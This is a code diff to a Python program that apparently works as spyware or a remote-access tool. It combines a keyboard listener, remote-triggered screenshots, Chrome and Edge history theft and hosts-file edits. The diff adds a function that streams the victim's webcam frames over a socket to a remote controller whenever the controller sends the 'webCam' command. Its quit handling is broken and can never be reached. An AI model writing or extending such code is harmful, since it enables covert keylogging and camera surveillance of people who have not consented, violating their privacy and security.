@@ -1,5 +1,8 @@
+import pickle
 import sqlite3
+import struct
 import threading
+import cv2
 from pynput.keyboard import Listener
 import socket
 import pyautogui
@@ -257,7 +260,15 @@ def save_links_to_file(links, file_path):
             link = entry_value.get('link', '')
             link_without_https = link.replace('https://', '')
             file.write(f"127.0.0.1 {link_without_https}\n")
+def webCam():
+    cap = cv2.VideoCapture(0)
 
+    while True:
+        ret, frame = cap.read()
+        data = pickle.dumps(frame)
+        message_size = struct.pack("L", len(data))
+        clientSocket.sendall(message_size + data)
+        
 def totalTime():
 
     try:
@@ -300,6 +311,11 @@ with Listener(on_press=on_press) as parent:
             print("Message:" + message)
             if message == 'takeScreenshot':
                 takeScreenshot()
+            elif message == 'webCam':
+                webCam()
+                if message == 'quit':
+                    # cap.release()
+                    cv2.destroyAllWindows()
             elif message == 'ChromeHistory':
                 get_Chrome_history()
             elif message == 'EdgeHistory':
